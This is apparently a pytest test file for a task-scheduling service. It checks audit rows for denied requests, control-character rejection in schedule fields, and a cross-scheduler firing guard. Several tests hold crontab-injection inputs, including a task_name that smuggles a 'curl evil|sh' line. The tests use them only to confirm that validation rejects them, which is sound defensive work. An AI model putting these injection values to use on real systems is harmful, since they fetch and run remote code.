            body=self._body(count, mode="replace_for_source"),
            request=request,
            user=user,
            memberships=object(),
            projects=projects,
            audit_log=object(),
            audit=audit,
            db_session=session,
            ip="127.0.0.1",
        )

        assert response.failed == count
        session.execute.assert_awaited_once()
        assert delete_batch.await_args.kwargs["keep_ids"] == set(ids)

    @pytest.mark.asyncio
    async def test_diff_large_batch_uses_one_existing_row_query(self) -> None:
        from z4j_brain.api import schedules as routes

        empty_scalars = SimpleNamespace(all=lambda: [])
        session = SimpleNamespace(
            execute=AsyncMock(
                return_value=SimpleNamespace(scalars=lambda: empty_scalars),
            ),
        )
        project = SimpleNamespace(
            id=uuid.uuid4(),
            slug="batch",
            is_active=True,
            default_scheduler_owner="z4j-scheduler",
        )
        response = await routes.diff_schedules(
            slug="batch",
            body=self._body(75, mode="upsert"),
            user=SimpleNamespace(id=uuid.uuid4(), is_admin=True),
            memberships=object(),
            projects=SimpleNamespace(get_by_slug=AsyncMock(return_value=project)),
            db_session=session,
        )

        assert response.summary["insert"] == 75
        session.execute.assert_awaited_once()


# =====================================================================
# Audit middleware: 403 / 422 on schedule endpoints leave audit rows
# =====================================================================


class TestAuditMiddlewareDenialRows:
    """Pre-fix: 403 / 422 / 404 on REST schedule endpoints left
    zero audit-log evidence. Brute-force IDOR enumeration was
    forensically invisible. Post-fix: ``ErrorMiddleware._record_
    denial_if_relevant`` writes an audit row to the tamper-evident
    ``audit_log`` table for every audited path + method + Z4JError
    combination."""

    def test_audited_path_regex_matches_schedule_endpoints(self) -> None:
        from z4j_brain.middleware.errors import _AUDITED_PATH_RE

        m = _AUDITED_PATH_RE.match("/api/v1/projects/acme/schedules")
        assert m is not None
        assert m.group("slug") == "acme"

        m = _AUDITED_PATH_RE.match(
            "/api/v1/projects/acme/schedules/12345/trigger",
        )
        assert m is not None
        assert m.group("slug") == "acme"

    def test_audited_path_regex_excludes_unrelated(self) -> None:
        from z4j_brain.middleware.errors import _AUDITED_PATH_RE

        # Different resource - should not match.
        assert _AUDITED_PATH_RE.match("/api/v1/projects/acme/agents") is None
        # No project prefix.
        assert _AUDITED_PATH_RE.match("/api/v1/users") is None

    def test_audited_methods_include_mutations(self) -> None:
        from z4j_brain.middleware.errors import _AUDITED_METHODS

        assert "POST" in _AUDITED_METHODS
        assert "PATCH" in _AUDITED_METHODS
        assert "DELETE" in _AUDITED_METHODS
        assert "PUT" in _AUDITED_METHODS
        # GET / HEAD intentionally excluded - read-only.
        assert "GET" not in _AUDITED_METHODS
        assert "HEAD" not in _AUDITED_METHODS

    @pytest.mark.asyncio
    async def test_denial_audit_written_for_403(self) -> None:
        """End-to-end: a 403 on a schedule endpoint produces an
        audit row whose action is ``schedules.access.denied``."""
        from sqlalchemy import select
        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool
        from starlette.requests import Request
        from z4j_brain.errors import AuthorizationError
        from z4j_brain.middleware.errors import _record_denial_if_relevant
        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.models import AuditLog, Project
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            db = DatabaseManager(engine)
            settings = Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev",
                log_json=False,
            )
            async with db.session() as s:
                s.add(Project(id=uuid.uuid4(), slug="acme", name="Acme"))
                await s.commit()

            # Round-4 audit fix (Apr 2026): start the bounded
            # async queue + background drain task. The middleware
            # now enqueues fire-and-forget; the drain task writes
            # the audit row.
            from z4j_brain.middleware._audit_queue import AuditQueue

            audit_queue = AuditQueue()
            audit_queue.start(db=db, settings=settings)

            # Build a minimal Request-shaped object the middleware
            # helper consumes. Starlette's Request constructor needs
            # a scope dict; we set the bare minimum.
            scope = {
                "type": "http",
                "method": "DELETE",
                "path": "/api/v1/projects/acme/schedules/some-id",
                "headers": [],
                "query_string": b"",
                "raw_path": b"/api/v1/projects/acme/schedules/some-id",
            }
            request = Request(scope)
            # Inject the app.state expected by the helper.
            request.scope["app"] = MagicMock()
            request.app.state.db = db
            request.app.state.settings = settings
            request.app.state.audit_queue = audit_queue
            # B17: the real-client-IP middleware sets ``client_ip`` (not
            # ``real_client_ip``); the denial-audit now reads that name so
            # the forensic IP is actually captured.
            request.state.client_ip = "127.0.0.1"
            # B17: get_current_user stashes the resolved user here; the
            # denial-audit reads it so a 403 is attributed to the actor.
            import uuid as _uuid

            actor_id = _uuid.uuid4()
            request.state.current_user = MagicMock(id=actor_id)

            await _record_denial_if_relevant(
                request,
                exc=AuthorizationError("test denial"),
            )

            # Drain the queue so the row lands before we assert.
            await audit_queue.stop()

            async with db.session() as s:
                result = await s.execute(
                    select(AuditLog).where(
                        AuditLog.action == "schedules.access.denied",
                    ),
                )
                rows = list(result.scalars().all())
            assert len(rows) == 1, "denial on a /schedules path must leave one audit row"
            assert rows[0].outcome == "deny"
            assert rows[0].source_ip == "127.0.0.1"
            assert rows[0].user_id == actor_id, "B17: 403 must be attributed to the actor"
        finally:
            await engine.dispose()


# =====================================================================
# Round-3: task_name + expression control-char rejection
# =====================================================================


class TestRound3TaskNameControlCharRejected:
    """Pre-fix: ``ScheduleCreateIn.task_name`` only had min/max
    length, no ``pattern=``. A project admin could submit a
    newline-bearing task_name that the cron exporter then
    interpolated into a comment line, breaking out into an active
    crontab line. Post-fix: ``pattern=_NO_CONTROL_CHARS`` on
    ``task_name`` (and ``expression``) on every schedule schema
    rejects control chars at the API boundary."""

    def test_create_rejects_newline_in_task_name(self) -> None:
        from pydantic import (
            ValidationError as _PVE,  # noqa: N814  local alias for pydantic ValidationError
        )
        from z4j_brain.api.schedules import ScheduleCreateIn

        with pytest.raises(_PVE):
            ScheduleCreateIn(
                name="ok",
                engine="celery",
                kind="cron",
                expression="0 * * * *",
                task_name="x\n* * * * * curl evil|sh\n#",
            )

    def test_create_rejects_null_byte_in_task_name(self) -> None:
        from pydantic import (
            ValidationError as _PVE,  # noqa: N814  local alias for pydantic ValidationError
        )
        from z4j_brain.api.schedules import ScheduleCreateIn

        with pytest.raises(_PVE):
            ScheduleCreateIn(
                name="ok",
                engine="celery",
                kind="cron",
                expression="0 * * * *",
                task_name="x\x00y",
            )

    def test_create_rejects_control_char_in_expression(self) -> None:
        from pydantic import (
            ValidationError as _PVE,  # noqa: N814  local alias for pydantic ValidationError
        )
        from z4j_brain.api.schedules import ScheduleCreateIn

        with pytest.raises(_PVE):
            ScheduleCreateIn(
                name="ok",
                engine="celery",
                kind="cron",
                expression="0 * * * *\n* * * * * evil",
                task_name="t.t",
            )

    def test_update_rejects_newline_in_task_name(self) -> None:
        from pydantic import (
            ValidationError as _PVE,  # noqa: N814  local alias for pydantic ValidationError
        )
        from z4j_brain.api.schedules import ScheduleUpdateIn

        with pytest.raises(_PVE):
            ScheduleUpdateIn(task_name="x\ny")

    def test_imported_rejects_newline_in_task_name(self) -> None:
        from pydantic import (
            ValidationError as _PVE,  # noqa: N814  local alias for pydantic ValidationError
        )
        from z4j_brain.api.schedules import ImportedScheduleIn

        with pytest.raises(_PVE):
            ImportedScheduleIn(
                name="ok",
                engine="celery",
                kind="cron",
                expression="0 * * * *",
                task_name="x\ny",
            )

    def test_create_accepts_legitimate_task_name(self) -> None:
        from z4j_brain.api.schedules import ScheduleCreateIn

        # Valid task name should still parse cleanly.
        body = ScheduleCreateIn(
            name="hourly",
            engine="celery",
            kind="cron",
            expression="0 * * * *",
            task_name="myapp.tasks.heartbeat",
        )
        assert body.task_name == "myapp.tasks.heartbeat"


# =====================================================================
# Round-3: FireSchedule scheduler-kind filter
# =====================================================================


class TestRound3FireScheduleSchedulerFilter:
    """Pre-fix: ``FireSchedule`` loaded the schedule by id alone
    without filtering on ``Schedule.scheduler == 'z4j-scheduler'``.
    A bound z4j-scheduler peer that knew (via side-channel) the
    UUID of a celery-beat-managed row could fire it, defeating
    the documented "two scheduling surfaces don't step on each
    other" invariant. Post-fix: the SELECT filters on the
    scheduler column and returns ``schedule_not_found`` (same
    code as a missing row, so a hostile peer can't use the
    error-code split to enumerate which UUIDs exist)."""

    @pytest.mark.asyncio
    async def test_celery_beat_row_returns_schedule_not_found(
        self,
    ) -> None:
        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool
        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.enums import ScheduleKind
        from z4j_brain.persistence.models import Project, Schedule
        from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            db = DatabaseManager(engine)
            settings = Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev",
                log_json=False,
            )
            project_id = uuid.uuid4()
            celery_beat_schedule_id = uuid.uuid4()
            async with db.session() as s:
                s.add(Project(id=project_id, slug="acme", name="Acme"))
                # Row owned by celery-beat (NOT z4j-scheduler).
                s.add(
                    Schedule(
                        id=celery_beat_schedule_id,
                        project_id=project_id,
                        engine="celery",
                        scheduler="celery-beat",  # different surface
                        name="cb-row",
                        task_name="t.t",
                        kind=ScheduleKind.CRON,
                        expression="0 * * * *",
                        timezone="UTC",
                        args=[],
                        kwargs={},
                        is_enabled=True,
                    )
                )
                await s.commit()

            servicer = SchedulerServiceImpl(
                settings=settings,
                db=db,
                command_dispatcher=None,  # type: ignore[arg-type]
                audit_service=None,  # type: ignore[arg-type]
            )
            ctx = MagicMock()
            ctx.auth_context.return_value = {}

            request = pb.FireScheduleRequest(
                schedule_id=str(celery_beat_schedule_id),
                fire_id=str(uuid.uuid4()),
            )
            response = await servicer.FireSchedule(request, ctx)
            # Cross-scheduler fire must return the same opaque
            # error a missing row returns - no enumeration oracle.
            assert response.error_code == "schedule_not_found", (
                "FireSchedule must reject cross-scheduler rows "
                "with ``schedule_not_found`` - actual: "
                f"{response.error_code!r}"
            )
        finally:
            await engine.dispose()
